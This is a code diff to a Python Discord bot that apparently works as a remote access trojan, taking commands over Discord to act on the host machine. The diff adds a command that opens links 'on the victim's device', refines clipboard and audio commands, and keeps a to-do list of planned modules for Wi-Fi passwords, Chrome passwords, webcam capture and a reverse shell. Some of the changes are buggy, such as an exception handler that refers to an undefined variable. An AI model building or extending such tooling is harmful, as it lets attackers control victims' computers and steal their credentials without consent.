@@ -10,6 +10,7 @@ import mss
 
 from io import StringIO
 import threading as thr
+import webbrowser as wb
 import platform as pf
 import time as t
 import argparse
@@ -69,8 +70,8 @@ ALLOWED_MODULES.sort()
 
 
 
-def play_audio(author: str, filepath: str):
-    printf(f'{a(author)} [i green3]Playing [u]{filepath}[/]')
+def play_audio(ctx: ApplicationContext, filepath: str):
+    printf(f'{a(ctx)} [i green3]Playing [u]{filepath}[/]')
     playsound(filepath)
     
 
@@ -98,7 +99,7 @@ async def on_ready():
     global USR
     USR = get_user(SYSTEM)
     panel = Panel(
-        f'[bold deep_sky_blue1]Logged in as [u]{bot.user}[/][/]',
+        f'[bold green1]LOGGED IN AS [u]{bot.user}[/][/]',
         title='[u bold dark_green][INFORMATION][/]',
         subtitle=f'[magenta1]({t.asctime()})[/]',
         border_style='bold yellow2'
@@ -126,7 +127,7 @@ async def on_interaction(interaction: discord.Interaction):
         arg_text = '<'
         arg_text += ', '.join(args_list)
         arg_text += '>'
-    printf(f' [light_goldenrod1]{arg_text}[/]')
+    printf(f' [turquoise2]{arg_text}[/]')
     # Processes the command
     await bot.process_application_commands(interaction)
 
@@ -214,13 +215,13 @@ async def play_audio_command(ctx: ApplicationContext, music_file: Option(discord
         # Checks if its an audio file
         if not file_type.startswith('audio'):
             await ctx.respond('I need an audio file -_-')
-            printf(f'{a(ctx)} [red3][i]Told them that I need an audio file[/][/]')
+            printf(f'{a(ctx)} [i red3]Told them that I need an audio file[/]')
             return
 
         # Checks if something is already playing (aka is the thread active)
         if audio_thread.is_alive():
             await ctx.respond('I am already playing something')
-            printf(f'{a(ctx)} [red3][i]Told them that I am already playing something[/][/]')
+            printf(f'{a(ctx)} [i red3]]Told them that I am already playing something[/]')
             return
         # Downloads the file
         og_msg = await ctx.respond('Downloading....')
@@ -237,16 +238,19 @@ async def play_audio_command(ctx: ApplicationContext, music_file: Option(discord
 
 
 @bot.slash_command(name='audio-check', description='Checks if some audio is playing due to us', guild_ids=GUILD_IDS)
-async def stop_audio_command(ctx: ApplicationContext):
-    global audio_thread
-    # Checks if user has allowed us to use this module
-    if not await is_module_allowed(ctx, ALLOWED_MODULES, 'Play Audio'):    return
+async def check_audio_command(ctx: ApplicationContext):
+    try:
+        global audio_thread
+        # Checks if user has allowed us to use this module
+        if not await is_module_allowed(ctx, ALLOWED_MODULES, 'Play Audio'):    return
 
-    # Assigns strings on the basis of "is the thread active?"
-    text     =  'No audio is being played'                if not audio_thread.is_alive() else 'Some audio is being played'
-    log_text = 'Told them that no audio is being played' if not audio_thread.is_alive() else 'Told them that some audio is being played'
-    await ctx.respond(text)
-    printf(f'{a(ctx)} [i green3]{log_text}[/]')
+        # Assigns strings on the basis of "is the thread active?"
+        text     =  'No audio is being played'                if not audio_thread.is_alive() else 'Some audio is being played'
+        log_text = 'Told them that no audio is being played' if not audio_thread.is_alive() else 'Told them that some audio is being played'
+        await ctx.respond(text)
+        printf(f'{a(ctx)} [i green3]{log_text}[/]')
+    except:
+        await handle_error(ctx, e, console)
 
 
 
@@ -259,7 +263,7 @@ async def clipboard_command(ctx: ApplicationContext, choice: Option(str, 'Copy o
         # Checks if they wanted to copy but didn't enter anything
         if choice == 'copy' and not to_copy:
             await ctx.respond('You need to enter something to copy')
-            printf(f'{a(ctx)} [red3][i]Told them that they need to enter something to copy[/][/]')
+            printf(f'{a(ctx)} [i red3]Told them that they need to enter something to copy[/]')
             return
 
         # Paste
@@ -286,6 +290,27 @@ async def clipboard_command(ctx: ApplicationContext, choice: Option(str, 'Copy o
 
 
 
+@bot.slash_command(name='link', description='Open a link on the victim\'s device', guild_ids=GUILD_IDS)
+async def link_command(ctx: ApplicationContext, link: Option(str, 'Enter the link to open')):
+    try:
+        # Checks if user has allowed us to use this module
+        if not await is_module_allowed(ctx, ALLOWED_MODULES, 'Open Link(s)'):    return
+
+        # Formats the link
+        link = f'https://{link}' if not link.startswith('http') else link
+        # Tries to open it
+        res = wb.open(link)
+        # Checks if we succeeded
+        if res:
+            await ctx.respond(f'Opened {link}')
+            printf(f'{a(ctx)} [i green3]Opened the link[/]')
+        # If not, tells the user
+        else:
+            await ctx.respond(f'I could not open {link}')
+            printf(f'{a(ctx)} [red3][i]Told them that I could not open the link[/][/]')
+    except Exception as e:
+        await handle_error(ctx, e, console)
+
 
 
 
@@ -309,9 +334,10 @@ main()
 
 
 '''
-['Wifi Passwords', 'Chrome Passwords', 'Webcam', 'Reverse Shell', 'General Info', 'Display', 'Link', 'Rotate Screen']
+['Wifi Passwords', 'Chrome Passwords', 'Webcam', 'Reverse Shell', 'General Info', 'Display', 'Rotate Screen']
 
 -> on_disconnect
 -> Use subprocess in /speak
+-> Change color of arguments
 '''
 
